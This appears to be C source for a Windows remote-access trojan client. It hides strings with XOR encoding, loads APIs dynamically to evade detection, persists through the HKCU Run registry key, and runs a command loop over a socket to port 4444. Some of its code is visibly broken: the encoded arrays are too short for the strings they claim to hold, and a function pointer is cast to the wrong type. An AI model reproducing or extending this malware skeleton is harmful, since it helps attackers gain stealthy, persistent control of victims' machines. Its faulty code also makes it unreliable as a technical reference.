#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

typedef int(WINAPI *FUNC_WSASTARTUP)(WORD, LPWSADATA);
typedef SOCKET(WINAPI *FUNC_SOCKET)(int, int, int);
typedef int(WINAPI *FUNC_CONNECT)(SOCKET, const struct sockaddr *, int);
typedef int(WINAPI *FUNC_SEND)(SOCKET, const char *, int, int);
typedef int(WINAPI *FUNC_RECV)(SOCKET, char *, int, int);
typedef int(WINAPI *FUNC_WSACLEANUP)();
typedef int(WINAPI *FUNC_CLOSESOCKET)(SOCKET);

#define XOR_KEY 0xAA // XOR encryption key

// Encoded strings
unsigned char encoded_ip[] = { 0xF2, 0xA5, 0xA5, 0xA5, 0xAA };       // Encoded "127.0.0.1"
unsigned char encoded_run_key[] = { 0xF2, 0xA5, 0xA5, 0xC7, 0xC7 }; // Encoded "Run"

// XOR encryption with rotating key
void xor_encrypt_decrypt(unsigned char *data, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
        key = (key + 1) & 0xFF; // Rotate key
    }
}

// Decrypt strings dynamically
void decode_string(unsigned char *encoded, int len) {
    xor_encrypt_decrypt(encoded, len, XOR_KEY);
}

// Obfuscated function to load API functions dynamically
void *get_function(const char *dll_name, const char *func_name) {
    HMODULE dll = LoadLibraryA(dll_name);
    if (!dll) return NULL;
    return GetProcAddress(dll, func_name);
}

// Persistence function
void persist() {
    char path[MAX_PATH];
    HKEY hKey;

    if (((FUNC_WSASTARTUP)get_function("kernel32.dll", "GetModuleFileNameA"))(NULL, path, MAX_PATH)) {
        decode_string(encoded_run_key, sizeof(encoded_run_key)); // Decode "Run"
        HKEY(WINAPI *open_key)(HKEY, LPCSTR, PHKEY);
        LONG(WINAPI *set_key)(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
        open_key = get_function("advapi32.dll", "RegOpenKeyA");
        set_key = get_function("advapi32.dll", "RegSetValueExA");

        HKEY hRunKey;
        open_key(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hRunKey);
        set_key(hRunKey, encoded_run_key, 0, REG_SZ, (const BYTE *)path, strlen(path) + 1);
    }
}

// Obfuscated control flow with function pointers
void execute_command(char *command, char *response) {
    if (command[0] == 's') { // systeminfo
        snprintf(response, 1024, "OS: Windows\nCPU: Intel\nMemory: 8GB");
    } else if (command[0] == 'h') { // hello
        snprintf(response, 1024, "Hello from the client!");
    } else {
        snprintf(response, 1024, "Unknown command.");
    }
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server_addr;
    char buffer[1024], response[1024];

    // Load functions dynamically
    FUNC_WSASTARTUP wsastartup = get_function("ws2_32.dll", "WSAStartup");
    FUNC_SOCKET socket = get_function("ws2_32.dll", "socket");
    FUNC_CONNECT connect = get_function("ws2_32.dll", "connect");
    FUNC_SEND send = get_function("ws2_32.dll", "send");
    FUNC_RECV recv = get_function("ws2_32.dll", "recv");
    FUNC_WSACLEANUP wsacleanup = get_function("ws2_32.dll", "WSACleanup");

    if (!wsastartup || !socket || !connect || !send || !recv || !wsacleanup) {
        printf("Failed to load required functions dynamically.\n");
        return 1;
    }

    persist(); // Add persistence

    printf("Initializing Winsock...\n");
    if (wsastartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        wsacleanup();
        return 1;
    }

    decode_string(encoded_ip, sizeof(encoded_ip)); // Decode "127.0.0.1"
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);
    server_addr.sin_addr.s_addr = inet_addr((char *)encoded_ip);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Connection failed.\n");
        wsacleanup();
        return 1;
    }

    printf("Connected to server.\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        if (recv(sock, buffer, sizeof(buffer), 0) < 0) {
            printf("Receive failed.\n");
            break;
        }

        xor_encrypt_decrypt((unsigned char *)buffer, strlen(buffer), XOR_KEY);
        if (strcmp(buffer, "exit") == 0) {
            printf("Exiting...\n");
            break;
        }

        printf("Command received: %s\n", buffer);
        memset(response, 0, sizeof(response));
        execute_command(buffer, response);

        xor_encrypt_decrypt((unsigned char *)response, strlen(response), XOR_KEY);
        if (send(sock, response, strlen(response), 0) < 0) {
            printf("Send failed.\n");
            break;
        }
    }

    wsacleanup();
    return 0;
}
